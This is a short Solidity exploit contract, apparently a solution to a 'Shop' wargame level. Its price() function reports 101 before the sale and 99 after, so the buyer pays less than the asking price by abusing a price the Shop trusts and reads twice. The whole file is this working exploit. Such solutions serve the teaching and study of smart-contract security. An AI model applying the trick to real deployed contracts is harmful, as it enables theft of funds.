// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import {Script, console, console2} from "forge-std/Script.sol";
import "../src/Shop.sol";

contract Shop_exp{

    Shop shop;

    constructor(Shop v) public  {
        shop = v;
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint256){
        bool isSold = shop.isSold();
        if(!isSold){
            return 101;
        }else{
            return 99;
        }

    }


}